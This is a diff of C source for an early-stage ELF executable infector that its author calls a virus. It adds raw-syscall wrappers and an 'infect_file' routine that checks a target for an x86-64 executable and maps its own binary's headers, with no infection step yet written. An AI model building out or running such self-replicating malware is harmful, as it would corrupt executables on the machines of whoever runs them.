@@ -1,4 +1,5 @@
 #include <fcntl.h>
+#include <elf.h>
 #include <dirent.h>     /* Defines DT_* constants */
 #include <fcntl.h>
 #include <stdio.h>
@@ -6,6 +7,7 @@
 #include <stdlib.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
+#include <sys/mman.h>
 
 struct linux_dirent64 {
 	long		d_ino;
@@ -105,6 +107,37 @@ char * virus_itoa(long x, char *t)
 	return t;
 }
 
+void *virus_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
+{
+	long mmap_fd = fd;
+	unsigned long mmap_off = off;
+	unsigned long mmap_flags = flags;
+	unsigned long ret;
+	__asm__ volatile(
+		"mov %0, %%rdi\n"
+		"mov %1, %%rsi\n"
+		"mov %2, %%rdx\n"
+		"mov %3, %%r10\n"
+		"mov %4, %%r8\n"
+		"mov %5, %%r9\n"
+		"mov $9, %%rax\n"
+		"syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
+	asm ("mov %%rax, %0" : "=r"(ret));              
+	return (void *)ret;
+}
+
+int virus_fstat(long fd, void *buf)
+{
+	long ret;
+	__asm__ volatile(
+		"mov %0, %%rdi\n"
+		"mov %1, %%rsi\n"
+		"mov $5, %%rax\n"
+		"syscall" : : "g"(fd), "g"(buf));
+	asm("mov %%rax, %0" : "=r"(ret));
+	return (int)ret;
+}
+
 size_t virus_strlen(char *s)
 {
 	size_t size;
@@ -126,8 +159,30 @@ void getfullpath(){
 }
 
 void infect_file(char *file){
+	/*
 	virus_write(1, file,virus_strlen(file));
 	virus_write(1, "\n", 1);
+	*/
+	//do some check
+	char headbuf[4096];
+	int f = virus_open(file,O_RDONLY, 0);
+	virus_read(f,headbuf,4096);
+	virus_close(f);
+	Elf64_Ehdr *ehdr = (Elf64_Ehdr *) headbuf;
+	if(ehdr->e_type != ET_EXEC) return;
+	if(ehdr->e_machine != EM_X86_64) return;
+	
+	//load self
+	int self = virus_open("./test/test",O_RDONLY, 0);
+	struct stat s;
+	virus_fstat(self, &s);
+	char* mem = (char*)virus_mmap(NULL,s.st_size,PROT_READ|PROT_WRITE, MAP_PRIVATE, self, 0);
+	Elf64_Ehdr *self_ehdr = (Elf64_Ehdr *)mem;
+	Elf64_Phdr *self_phdr = (Elf64_Phdr *)&mem[self_ehdr->e_phoff];
+	Elf64_Shdr *self_shdr = (Elf64_Shdr *)&mem[self_ehdr->e_shoff];
+	char nu[10];
+	virus_write(1, virus_itoa(ehdr->e_phnum,nu), 10);
+	
 }
 
 //dir must end with /
@@ -199,7 +254,13 @@ void _start()
 		virus_write(1, "\n", 1);
         }
 	*/
+
+	/*
 	char *start[1] = {"/home/lkm/workspace/virus/test/"};
 	infect_dir(start[0]);
+	*/
+
+	char *start[1] = {"/home/lkm/workspace/virus/test/test"};
+	infect_file(start[0]);
 	virus_exit(0);
 }
